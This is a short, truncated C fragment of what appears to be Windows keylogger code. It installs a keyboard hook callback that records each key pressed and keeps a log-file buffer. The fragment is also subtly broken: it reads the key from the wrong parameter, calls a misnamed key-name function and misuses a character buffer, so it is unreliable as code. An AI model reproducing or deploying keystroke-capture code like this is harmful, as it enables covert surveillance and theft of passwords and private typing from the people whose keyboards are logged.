bool isHooked = false;
char logFile[256];

// Window callback
LRESULT CALLBACK keyboardCallback(int nCode, int wParam, LPARAM lParam) {
    if (!isHooked) return 0;

    if (wParam == WM_KEYDOWN) {
        unsigned int key = wParam;
        bool isKeyDown = true;
        char keyChar = ' ';
        if (GetKeyNameString(key, keyChar, 1) != 0) {
            RecordKeystroke(keyChar, isKeyDown);
